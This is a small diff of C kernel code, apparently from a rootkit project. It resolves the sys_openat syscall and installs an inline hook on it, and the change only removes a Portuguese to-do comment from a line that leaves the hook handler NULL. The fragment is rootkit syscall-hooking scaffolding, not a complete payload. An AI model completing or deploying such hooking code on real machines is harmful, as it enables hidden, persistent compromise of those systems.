@@ -42,7 +42,7 @@ void setup_inline_hooks(void) {
     unsigned long target = rk_resolve_symbol("sys_openat");
     if (target) {
         openat_hook.target_func = (void *)target;
-        openat_hook.hook_func = NULL;  // Ajuste aqui quando implementar o handler real
+        openat_hook.hook_func = NULL;
         install_inline_hook(&openat_hook);
     }
 }
